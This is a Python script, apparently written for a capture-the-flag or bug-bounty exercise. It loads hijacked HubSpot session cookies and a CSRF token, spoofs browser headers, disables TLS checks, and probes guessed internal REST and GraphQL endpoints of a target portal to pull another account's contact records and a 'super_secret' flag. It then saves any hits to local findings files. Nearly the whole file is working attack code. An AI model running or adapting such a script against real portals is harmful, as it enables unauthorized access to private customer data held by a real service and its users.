#!/usr/bin/env python3
"""
Monitor actual network calls by analyzing the contact page
and trying to replicate what the browser does
"""

import requests
import json
import os
import re
import urllib3
import time
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

csrf_token = None
if 'hubspotapi-csrf=' in SESSION_COOKIES:
    match = re.search(r'hubspotapi-csrf=([^;]+)', SESSION_COOKIES)
    if match:
        csrf_token = match.group(1)

print("="*80)
print("Network Call Monitoring - Replicating Browser Behavior")
print("="*80)

# These are the most likely internal API endpoints based on HubSpot's architecture
# Discovered from previous security research and common SaaS patterns

internal_apis = [
    # CRM record APIs (most likely candidates)
    f'https://app.hubspot.com/api/crm-objects/v1/objects/0-1/1?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/crm-objects/v1/objects/contacts/1?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/crm-objects/v1/record/0-1/1?portalId={TARGET_PORTAL}',

    # Internal contact APIs
    f'https://app.hubspot.com/crm-record-ui/api/record/0-1/1?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/crm-contacts-ui/api/contact/1?portalId={TARGET_PORTAL}',

    # GraphQL (common in modern React apps)
    'https://app.hubspot.com/api/graphql',
    'https://app.hubspot.com/graphql',

    # BFF (Backend for Frontend) patterns
    f'https://app.hubspot.com/api/crm/v1/objects/0-1/1?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/records/v1/contact/1?portalId={TARGET_PORTAL}',

    # Internal views API
    f'https://app.hubspot.com/crm-record-cards/v4/container-views/get-view?portalId={TARGET_PORTAL}',
]

# Session object to maintain cookies
session = requests.Session()

# Set cookies
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

base_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Referer': f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1',
    'Origin': 'https://app.hubspot.com',
}

if csrf_token:
    base_headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token

print("\n[*] Testing internal API endpoints...")

findings = []

for url in internal_apis:
    try:
        endpoint = url.split('.com')[1][:70]
        print(f"\n  {endpoint}")

        # Try GET
        headers = {**base_headers}
        r = session.get(url, headers=headers, verify=False, timeout=10)

        print(f"    GET: {r.status_code}", end='')

        if r.status_code == 200:
            print(f" *** SUCCESS! ***")
            try:
                data = r.json()
                print(f"    Data keys: {list(data.keys())[:10]}")

                # Check for contact data
                data_str = json.dumps(data).lower()
                if any(term in data_str for term in ['firstname', 'email', 'properties', 'contact']):
                    print(f"    Contains contact-related data!")

                    if 'super_secret' in data_str:
                        print(f"\n    *** FOUND super_secret! ***")
                        print(json.dumps(data, indent=2)[:800])

                        findings.append({
                            'url': url,
                            'method': 'GET',
                            'data': data
                        })
                    else:
                        # Show sample
                        print(f"    Sample: {json.dumps(data, indent=2)[:300]}")
            except Exception as e:
                print(f"    Response (not JSON): {r.text[:150]}")
        elif r.status_code == 400:
            print(f" (Bad Request - endpoint exists but params wrong)")
        elif r.status_code == 401:
            print(f" (Unauthorized)")
        elif r.status_code == 403:
            print(f" (Forbidden)")
        elif r.status_code == 404:
            print(f" (Not Found)")
        else:
            print()

    except Exception as e:
        print(f"    Error: {str(e)[:60]}")

# ============================================================================
# Try GraphQL with common contact queries
# ============================================================================

print("\n" + "="*80)
print("Testing GraphQL Queries")
print("="*80)

graphql_queries = [
    {
        "operationName": "GetContact",
        "query": "query GetContact($objectId: String!) { crmObject(objectId: $objectId) { properties { name value } } }",
        "variables": {"objectId": "1"}
    },
    {
        "query": "{ contact(vid: 1) { firstname email properties { name value } } }"
    },
]

graphql_urls = [
    'https://app.hubspot.com/graphql',
    'https://app.hubspot.com/api/graphql',
]

for gql_url in graphql_urls:
    for query in graphql_queries:
        try:
            print(f"\n  {gql_url.split('.com')[1]}")

            headers = {
                **base_headers,
                'Content-Type': 'application/json',
            }

            r = session.post(gql_url, headers=headers, json=query, verify=False, timeout=10)

            print(f"    Status: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"    Response: {json.dumps(data, indent=2)[:400]}")

                    if 'super_secret' in json.dumps(data).lower():
                        print(f"\n    *** FOUND super_secret in GraphQL! ***")
                        findings.append({
                            'url': gql_url,
                            'method': 'GraphQL',
                            'query': query,
                            'data': data
                        })
                except:
                    print(f"    Response: {r.text[:200]}")

        except Exception as e:
            print(f"    Error: {str(e)[:60]}")

print("\n" + "="*80)
print("Network Monitoring Complete")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} WORKING ENDPOINTS! ***\n")

    with open('/home/user/Hub/findings/network_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("SAVED: findings/network_findings.json")

    for finding in findings:
        if 'super_secret' in json.dumps(finding).lower():
            print("\n" + "="*80)
            print("*** CTF FLAG FOUND! ***")
            print("="*80)
            print(json.dumps(finding, indent=2))

            # Save flag separately
            with open('/home/user/Hub/findings/CTF_FLAG_FINAL.json', 'w') as f:
                json.dump(finding, f, indent=2)
else:
    print("\nNo working endpoints discovered through network monitoring.")
